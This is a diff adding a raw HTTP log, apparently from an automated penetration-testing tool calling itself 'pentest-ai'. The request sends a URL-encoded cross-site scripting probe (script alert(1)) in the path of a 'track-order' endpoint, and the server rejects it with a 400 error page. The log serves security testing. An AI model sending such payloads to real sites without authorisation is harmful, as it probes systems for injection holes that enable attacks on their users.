@@ -1,0 +1,31 @@
+REQUEST:
+GET https://stirling-pdf.baliprov.dev/track-order/%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+
+
+RESPONSE:
+HTTP 400
+Date: Wed, 25 Nov 2026 00:26:21 GMT
+Content-Type: text/html;charset=iso-8859-1
+Content-Length: 472
+Connection: keep-alive
+Cache-Control: must-revalidate,no-cache,no-store
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+<title>Error 400 Ambiguous URI path separator</title>
+</head>
+<body>
+<h2>HTTP ERROR 400 Ambiguous URI path separator</h2>
+<table>
+<tr><th>URI:</th><td>http://stirling-pdf.baliprov.dev/track-order/%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E</td></tr>
+<tr><th>STATUS:</th><td>400</td></tr>
+<tr><th>MESSAGE:</th><td>Ambiguous URI path separator</td></tr>
+</table>
+
+</body>
+</html>
